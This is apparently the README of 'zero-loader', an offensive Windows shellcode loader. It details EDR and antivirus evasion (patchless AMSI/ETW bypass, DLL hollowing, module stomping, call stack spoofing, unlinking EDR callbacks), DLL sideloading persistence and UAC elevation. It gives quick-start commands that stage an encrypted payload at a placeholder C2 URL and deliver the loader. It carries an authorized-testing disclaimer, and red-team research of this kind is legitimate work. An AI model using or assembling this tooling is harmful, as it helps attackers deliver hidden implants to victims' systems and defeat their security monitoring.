<div align="center">

# zero-loader

**Polymorphic x64 shellcode loader**

Zero CRT. Zero static signatures. Zero trace in the call stack.

<br/>

![Arch](https://img.shields.io/badge/arch-x64-0d1117?style=for-the-badge&logo=windows&logoColor=white)
![Lang](https://img.shields.io/badge/C_|_MASM-0d1117?style=for-the-badge&logo=c&logoColor=white)
![CRT](https://img.shields.io/badge/CRT--free-0d1117?style=for-the-badge)
![License](https://img.shields.io/badge/MIT-0d1117?style=for-the-badge)

*Every build produces a unique binary — nothing matches across compilations.*

</div>

<br/>

> [!WARNING]
> This project is intended for authorized security testing, research, and educational purposes only. Unauthorized use against systems you do not own or have explicit permission to test is illegal. The author assumes no liability for misuse.

<br/>

## Overview

Most loaders get flagged because they ship the same binary. **zero-loader** regenerates all cryptographic material on every build — keys, nonces, string encoding, PE metadata. No two compilations share a hash.

<br/>

## Features

> **Evasion**

| | |
|:--|:--|
| **Indirect Syscalls** | SSN extraction from ntdll + hooked-stub fallback. 64 `syscall;ret` gadgets pooled, randomly selected per call via RDTSC |
| **Patchless AMSI/ETW** | VEH + hardware breakpoints (DR0/DR1) via `NtContinue` — zero bytes modified, passes integrity checks |
| **Phantom DLL Hollowing** | Auto-scans System32 for suitable DLL → copies to temp → NTFS transaction → SEC_IMAGE → rollback. EDR sees legitimate DLL-backed memory |
| **Module Stomping** | Overwrite signed DLL `.text` section. Memory attributed to a Microsoft binary |
| **Call Stack Spoofing** | `call rbx` gadget in ntdll + thread pool trampoline. All frames resolve to legitimate modules |
| **Anti-Analysis** | PEB debugger flag, NtGlobalFlag, CPU count, RDTSC timing delta |
| **IAT Camouflage** | Dead-code benign imports the optimizer cannot eliminate |
| **Blind DLL Notifications** | Walks and unlinks all EDR `LdrRegisterDllNotification` callbacks — subsequent `LoadLibrary` invisible |
| **Exit Hook** | Patches `RtlExitUserProcess` with PAUSE loop — prevents host exit from killing C2 (DLL sideload) |
| **Post-Exec Cleanup** | Removes VEH, clears DR0/DR1/DR7 via `NtContinue`, wipes keys/URLs/nonces before shellcode execution |

> **Crypto & Staging**

| | |
|:--|:--|
| **Chaskey-12 CTR** | ARX block cipher — pure ALU, no S-boxes, no lookup tables, no RC4 signatures |
| **LZNT1 Compression** | Compressed before encryption, decompressed at runtime via ntdll |
| **Polymorphic Strings** | 4-byte rotating XOR across 25+ strings, keys regenerated every build |
| **PE Mutation** | TimeDateStamp, Rich header, section padding, checksum — randomized post-build |
| **HTTPS Staging** | Dynamic WinINet + `InternetCrackUrlA` + self-signed cert bypass |
| **W^X Memory** | `PAGE_EXECUTE_READ` default. `RWX_SHELLCODE` flag for Go-based implants |

> **DLL Sideloading**

| | |
|:--|:--|
| **Export Forwarding** | Auto-generated linker pragmas — PE loader handles all legitimate API calls natively |
| **Version Info Cloning** | Extracts and reproduces `VS_VERSIONINFO` from target DLL |
| **Process Persistence** | `RtlExitUserProcess` patch + `LdrAddRefDll` pin — DLL survives host exit |
| **Optional UAC** | `uac` build flag enables self-relaunch elevation via `ShellExecuteA("runas")` |
| **Loader Lock Safe** | DllMain uses ntdll-only APIs; loader pipeline deferred to thread pool |

<br/>

## Quick Start

```bash
# 1  Encrypt & compress shellcode
python Encrypt.py payload.bin --url https://<C2>:<PORT>/payload.dat

# 2  Build
build.bat                                  # EXE
build.bat uac                              # EXE with UAC manifest

# 3  Deploy — upload data.enc to staging server, deliver the EXE
```

> Re-run steps 1 & 2 for a completely new binary.

<details>
<summary><b>DLL Sideloading</b></summary>

<br/>

```bash
# 1  Generate export forwarding
python SideloadGen.py C:\Windows\System32\<target>.dll

# 2  Encrypt shellcode
python Encrypt.py payload.bin --url https://<C2>:<PORT>/payload.dat

# 3  Build
build.bat sideload <target>.dll            # no UAC
build.bat sideload <target>.dll uac        # self-relaunch UAC

# 4  Deploy
#    Rename real <target>.dll → <target>_orig.dll
#    Place proxy <target>.dll + <target>_orig.dll alongside host EXE
#    Upload data.enc to staging server, run host EXE
```

</details>

<details>
<summary><b>Build Flags</b></summary>

<br/>

Edit `Common.h` or pass via `build.bat`:

| Flag | Default | Purpose |
|:-----|:--------|:--------|
| `DEBUG` | Off | Logging to `debug.log`, skips anti-analysis |
| `RWX_SHELLCODE` | Off | `PAGE_EXECUTE_READWRITE` for Go/Sliver |
| `BUILD_DLL` | Off | DLL sideload build (set by `build.bat sideload`) |
| `REQUIRE_ELEVATION` | Off | Self-relaunch UAC for DLL sideload (`build.bat sideload ... uac`) |

</details>

<details>
<summary><b>Requirements</b></summary>

<br/>

- Windows 10/11 x64
- Visual Studio 2022+ (MSVC + ml64)
- Python 3.x

</details>

<br/>

## Architecture

### Execution Chain

```
Main()
 │
 ├─ IatCamouflage              pad IAT with benign imports
 ├─ AntiAnalysis               PEB · NtGlobalFlag · RDTSC
 ├─ InitializeNtSyscalls       SSN extraction + 64 gadget pool
 ├─ InitializeWinApis          PEB walk → kernel32 → JOAAT resolve
 ├─ PatchlessAmsiEtw           DR0 = EtwEventWrite
 │                              DR1 = AmsiScanBuffer
 ├─ BruteForceDecryption       recover Chaskey key
 ├─ DownloadPayload            HTTPS GET → encrypted blob
 ├─ ChaskeyCtrDecrypt          in-place decryption
 ├─ DecompressPayload          LZNT1 via RtlDecompressBuffer
 │
 ├─ ┌ PhantomDllHollow ─────── NTFS txn → SEC_IMAGE → rollback
 ├─ │ ModuleStomp ──────────── overwrite signed DLL .text
 ├─ └ NtAllocateVirtualMemory  private RW → RX  (last resort)
 │
 ├─ CleanupEvasion             wipe VEH · DR regs · keys · URLs
 ├─ FindCallGadget             FF D3 (call rbx) in ntdll
 ├─ SetSpoofTarget             configure ASM trampoline
 ├─ TpAllocWork / TpPostWork   thread pool execution
 └─ NtDelayExecution           keep-alive via indirect syscall
```

### DLL Sideload Flow

```
Host EXE loads proxy DLL → DllMain
 │
 ├─ PEB walk → find ntdll
 ├─ InstallExitHook            patch RtlExitUserProcess (PAUSE loop)
 ├─ TpAllocWork(SideloadWorker) → TpPostWork → return TRUE
 │   [Host app continues, ExitProcess blocked]
 │
 └─ SideloadWorker (thread pool)
     ├─ [uac] IsElevated? → no: ShellExecuteA "runas" → terminate self
     ├─ LdrAddRefDll           pin DLL in memory
     └─ Main()                 full loader pipeline
```

### Call Stack

```
 RIP  shellcode           ← phantom/stomped DLL .text (signed)
  ↓   call rbx gadget     ← ntdll
  ↓   TppWorkpExecute     ← ntdll
  ↓   TppWorkerThread     ← ntdll
  ↓   RtlUserThreadStart  ← ntdll
```

Every frame resolves to a legitimate module.

### Encryption Pipeline

```
  Build time                              Runtime
  ──────────                              ───────

  shellcode.bin                     HTTPS download
       │                                 │
  LZNT1 compress                    Chaskey-CTR decrypt
       │                                 │
  Chaskey-CTR encrypt ─→ data.enc ─→ LZNT1 decompress
       │                                 │
  key protection                    brute-force recovery
  (XOR + offset)
       │
  Payload.h
  (randomized keys, nonce, strings)
```

<br/>

## Project Layout

```
main.c              orchestrates the execution chain
Syscalls.h/.c       indirect syscall engine · SSN + gadget pool
AsmStub.asm         x64 MASM · RunSyscall · SpoofCallback
WinApi.c            PEB walking · JOAAT hashing · CRT stubs
Evasion.c           patchless AMSI/ETW · anti-analysis · cleanup
Stomper.c           phantom hollowing (auto DLL scan) · module stomping · gadgets
Crypt.c             Chaskey-12 CTR · LZNT1 · key recovery
Staging.c           HTTPS staging · cert bypass
Common.h            defines · hashes · typedefs · macros
Structs.h           undocumented NT structures
Payload.h           auto-generated (never edit)
Sideload.c          DLL entry point · exit hook · elevation
SideloadGen.py      export forwarding generator · version info cloning
Sideload.h          auto-generated export forwards (never edit)
Sideload.rc         auto-generated version info (never edit)
Encrypt.py          encryption + compression + obfuscation
Mutate.py           post-build PE metadata randomizer
build.bat           ml64 → cl → Mutate.py
```
